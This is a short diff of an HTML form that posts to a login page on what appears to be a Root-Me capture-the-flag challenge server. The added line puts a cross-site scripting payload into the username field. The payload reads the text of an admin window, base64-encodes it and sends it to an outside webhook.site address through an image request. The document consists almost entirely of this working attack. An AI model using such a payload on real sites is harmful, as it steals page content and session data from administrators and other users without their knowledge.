@@ -1,5 +1,5 @@
  <form id="f" method="POST" action="http://challenge01.root-me.org:58003/login">
-  <input name="username" value="VOTRE_USERNAME_XSS">
+  <input name="username" value="<script>var wb='http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';var w=window.open('','adminpf');var s=w?(w.document&&w.document.body?w.document.body.innerText:'w_no_body'):'no_adminpf';new Image().src=wb+'?d='+btoa(s);</script>">
   <input name="secret" value="x">
 </form>
 <script>
